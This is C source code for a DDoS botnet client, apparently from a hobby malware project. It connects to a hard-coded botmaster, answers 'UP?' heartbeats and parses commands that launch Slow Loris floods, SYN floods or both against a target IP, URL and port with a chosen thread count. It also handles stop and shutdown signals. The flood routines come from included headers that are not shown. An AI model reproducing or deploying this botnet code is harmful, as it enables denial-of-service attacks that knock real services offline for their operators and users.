#include "packet.h"
#include <strings.h>
#include <time.h>
#include "attacks/slow-loris.h"
#include "attacks/syn-flood.h"

#define SLOW_LORIS 0
#define SYN_FLOOD 1
#define ALL 2

#define BOT_MASTER "127.0.0.1"

// ******************** TO DO *****************
// -> Add SSL encryption when communicating with the server

int main_sock;
struct sockaddr_in server;

// reads from the udp socket which is connected to the master. and closes if it recieves the signal.
void wait_and_close(int f_write)
{
	while(1){
		char data[12];
		
		read(main_sock, data, 10);
		
		if(strstr(data, "UP?") != NULL){
			// Run the code to tell that we are alive.
			write(main_sock, "?YES!", 5);
		}else if(strstr(data, "[!DDOS!]") != NULL){
			printf("[*]Stopping Current DDOS\n");
			write(f_write, "EXIT", 4);
			close(f_write);
			return;
		}
	}
}


// NOTE: forks will be ignored for now
void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
{

	if(type == SLOW_LORIS){
		int msg_pipe[2];
		pipe(msg_pipe);

		pid_t pid = fork();
		
		if(pid == 0){
			// closes the output to write to.
			close(msg_pipe[1]);
			// Here goes the flood_slow_loris.
			flood_slow_loris(target_ip, n_thrds, NULL, msg_pipe[0]);
		}else{
			close(msg_pipe[0]);
			wait_and_close(msg_pipe[1]);
		}
	} else if(type == SYN_FLOOD){
		int msg_pipe[2];
		pipe(msg_pipe);

		pid_t pid = fork();
		
		if(pid == 0){
			// closes the output to write to.
			close(msg_pipe[1]);
			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
		}else{
			// closes the input to recv from.
			close(msg_pipe[0]);
			wait_and_close(msg_pipe[1]);
		}
	} else if(type == ALL){
		// need to add the pipe functionality.
		int msg_pipe[2];
		pipe(msg_pipe);
		pid_t pid1 = fork();
		if(pid1 == 0){
			close(msg_pipe[1]);
			flood_slow_loris(target_url, n_thrds, NULL, msg_pipe[0]);
		}
		pid_t pid2 = fork();

		if(pid2 == 0){
			close(msg_pipe[1]);
			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
		}
		wait_and_close(msg_pipe[1]);
	}
	return;
}

void init(char *to_con, int port)
{
	main_sock = make_socket();

	server.sin_addr.s_addr = inet_addr(to_con);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
 
    //Connect to remote server
    if (connect(main_sock , (struct sockaddr *)&server , sizeof(server)) == ERROR)
    {
        perror("connect error");
        _exit(1);
    }

	printf("\033[0;35m[+] Connected to %s \033[0m\n", to_con);
}

void connect_to_master()
{
	int bytes;
	char data_recved[81];
	int type;
	char target_ip[31];
	char thrds[5];
	char s_port[7];
	while(1){
		memset(data_recved, 0, 81);
		memset(target_ip, 0, 31);
		memset(thrds, 0, 5);
		memset(s_port, 0, 7);

		bytes = read(main_sock, data_recved, 80);		

		if (bytes== ERROR){
			perror("Unable to recv Data: ");
			exit(1);
		}else if(bytes == 0){
			printf("[*] Server Closed the connection\n");
			return;
		}
		// DEBUG
		printf("Data: %s\n", data_recved);

		if(strncmp(data_recved, "[!SHUTDOWN!]", 12) == 0){
			close(main_sock);
			printf("Shutdown signal from Master\n");
			_exit(0);
		}else if(strncmp(data_recved, "UP?", 3) == 0){
			write(main_sock, "?YES!", 5);
		}else if(strncmp(data_recved, "SLOW-LORIS", 10) == 0){
			type = SLOW_LORIS;

			char *i_of_ip = index(data_recved, (int ) ' ')+1;
			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
			strncpy(target_ip, i_of_ip, len_ip);
			target_ip[len_ip] = 0;
			// DEBUG
			printf("\033[0;35mIP: %s\n", target_ip);

			char *i_of_thrds = i_of_ip+len_ip+1;
			strncpy(thrds, i_of_thrds, 4);
			// DEBUG
			printf("Threads: %s\033[0m\n", thrds);

			DDOS(type, target_ip, 0, atoi(thrds), NULL);

		}else if(strncmp(data_recved, "SYN-FLOOD", 9) == 0){
			type = SYN_FLOOD;

			char *i_of_ip = index(data_recved, (int ) ' ')+1;
			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
			strncpy(target_ip, i_of_ip, len_ip);
			target_ip[len_ip] = 0;
			// DEBUG
			printf("\033[0;32mIP: %s\n", target_ip);

			char *i_of_thrds = i_of_ip+len_ip+1;
			unsigned char len_thrds = (index(i_of_thrds, (int) ' ')) - i_of_thrds;
			strncpy(thrds, i_of_thrds, len_thrds);
			thrds[len_thrds] = 0;
			// DEBUG
			printf("Threads: %s\n", thrds);

			char *i_of_port = i_of_thrds+len_thrds+1;
			//int len_port = (index(i_of_thrds+1, (int ) ' ')) - i_of_port;
			strncpy(s_port, i_of_port, 6);
			// DEBUG
			printf("port: %s\033[0m\n", s_port);

			DDOS(type, target_ip, atoi(s_port), atoi(thrds), NULL);

		}else if(strncmp(data_recved, "*", 1) == 0){
			type = ALL;

			char target_url[30];

			char *i_of_ip = index(data_recved, (int ) ' ')+1;
			int len_ip =  (index(i_of_ip+1, (int ) ' ') - i_of_ip);
			strncpy(target_ip, i_of_ip, len_ip);
			target_ip[len_ip] = 0;
			// DEBUG
			printf("\033[0;36mIP: %s|\n", target_ip);

			char *i_of_url = i_of_ip+len_ip+1;
			int len_url = (index(i_of_url+1, (int ) ' ') - i_of_url);
			strncpy(target_url, i_of_url, len_url);
			target_url[len_url] = 0;
			// DEBUG
			printf("URL: %s\n", target_url);

			char *i_of_port = i_of_url+len_url+1;
			int len_port = (index(i_of_port+1, (int) ' ') - i_of_port);
			strncpy(s_port, i_of_port, len_port);
			s_port[len_port] = 0;
			// DEBUG
			printf("Port for SYN_FLOOD: %s\n", s_port);

			char *i_of_thrds = rindex(data_recved, (int) ' ')+1;
			strncpy(thrds, i_of_thrds, 4);
			// DEBUG
			printf("Threads: %s\033[0m\n", thrds);

			DDOS(type, target_ip, atoi(s_port), atoi(thrds), target_url);

		}

	}
}

int main(int argc, char const *argv[])
{
	// Printing the Banner.
	srand(time(NULL));
	switch(rand()%5){
		case 0:
			printf("\033[0;31m");break;
		case 1:
			printf("\033[0;32m");break;
		case 2:
			printf("\033[0;34m");break;
		case 3:
			printf("\033[0;33m");break;
		case 4:
			printf("\033[0;35m");break;
	}
	printf(" ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄\n");
	printf("▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ \n");
	printf("▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          \n");
	printf("▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ \n");
	printf("▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌\n");
	printf("▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌\n");
	printf("▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌\n");
	printf("▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf(" ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ \n");
	printf("\033[0m\n");

	printf("\033[0;32m[+] Initializing the Bot!\033[0m\n");
	
	init(BOT_MASTER, 15551);
	// Change the IP when compiling.
	connect_to_master();

	return 0;
}
